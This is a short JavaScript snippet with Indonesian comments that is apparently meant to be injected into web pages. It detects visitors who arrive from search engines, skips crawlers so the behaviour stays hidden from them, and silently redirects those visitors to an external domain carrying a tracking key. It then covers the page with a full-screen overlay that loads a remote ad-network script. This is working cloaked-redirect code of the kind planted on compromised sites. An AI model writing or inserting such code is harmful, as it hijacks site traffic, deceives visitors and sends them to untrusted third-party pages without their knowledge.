(function() {
    // 1. AUTO-UPGRADE: Memaksa browser menarik resource via HTTPS 
    // meskipun dipanggil dari link HTTP
    try {
        if (!document.querySelector('meta[content="upgrade-insecure-requests"]')) {
            var meta = document.createElement('meta');
            meta.httpEquiv = "Content-Security-Policy";
            meta.content = "upgrade-insecure-requests";
            document.head.prepend(meta);
        }
    } catch (e) {}

    // 2. DETEKSI TRAFIK SEARCH ENGINE (Redirect)
    const se = ["google.", "bing.", "yahoo.", "baidu.", "yandex.", "duckduckgo."];
    const ref = document.referrer.toLowerCase();
    const isBot = /bot|googlebot|crawler|spider|robot/i.test(navigator.userAgent);

    if (!isBot && ref !== "") {
        if (se.some(s => ref.includes(s))) {
            window.location.replace("https://anguishgrandpa.com/scg1652n5?key=012f54500c0d91c4f78b75f72cb909d3");
            return;
        }
    }

    // 3. POPUP ADS (HTTPS Always)
    const style = document.createElement('style');
    style.innerHTML = '#popup-overlay-ads{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:flex;align-items:center;justify-content:center;z-index:999999}.popup-box-ads{width:300px;height:250px;background:#fff;position:relative;box-shadow:0 0 20px rgba(0,0,0,0.5)}.close-ad-x{position:absolute;top:-30px;right:0;color:#fff;background:#f00;padding:2px 8px;cursor:pointer;font-size:12px;font-family:sans-serif;border-radius:3px}';
    document.head.appendChild(style);

    const overlay = document.createElement('div');
    overlay.id = 'popup-overlay-ads';
    overlay.innerHTML = '<div class="popup-box-ads"><div class="close-ad-x" onclick="this.parentElement.parentElement.remove()">CLOSE [X]</div><div id="ad-space-300-250"></div></div>';
    document.body.appendChild(overlay);

    window.atOptions = { 'key' : 'c6519a79b77606d968cf36c00f3894c6', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };

    const adScript = document.createElement('script');
    adScript.type = 'text/javascript';
    // Gunakan HTTPS eksplisit untuk link iklan
    adScript.src = "https://www.highperformanceformat.com/c6519a79b77606d968cf36c00f3894c6/invoke.js";
    document.getElementById('ad-space-300-250').appendChild(adScript);
})();
